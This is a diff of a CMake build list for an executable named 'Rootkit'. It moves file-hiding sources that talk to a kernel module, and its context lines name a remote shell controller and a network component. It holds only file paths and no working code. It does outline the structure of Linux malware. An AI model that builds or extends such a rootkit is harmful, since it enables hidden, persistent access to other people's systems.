@@ -46,13 +46,13 @@ add_executable(Rootkit
         linux/features/network_exploder/network_exploder.cpp
         linux/features/network_exploder/network_exploder.h
 
-        linux/features/file_hider/file_hider.cpp
-        linux/features/file_hider/file_hider.h
-        linux/features/file_hider/kernel_access/kernel_access.cpp
-        linux/features/file_hider/kernel_access/kernel_access.h
-        linux/features/file_hider/kernel_access/operations_ids.h
-        linux/features/file_hider/kernel_access/msg_to_module.h
-        linux/features/file_hider/kernel_access/msg_to_user.h
+        linux/file_hiding_access/file_hiding_access.cpp
+        linux/file_hiding_access/file_hiding_access.h
+        linux/file_hiding_access/kernel_access/kernel_access.cpp
+        linux/file_hiding_access/kernel_access/kernel_access.h
+        linux/file_hiding_access/kernel_access/operations_ids.h
+        linux/file_hiding_access/kernel_access/msg_to_module.h
+        linux/file_hiding_access/kernel_access/msg_to_user.h
 
         linux/features/remote_cli_shell_controller/remote_cli_shell_controller.cpp
         linux/features/remote_cli_shell_controller/remote_cli_shell_controller.h
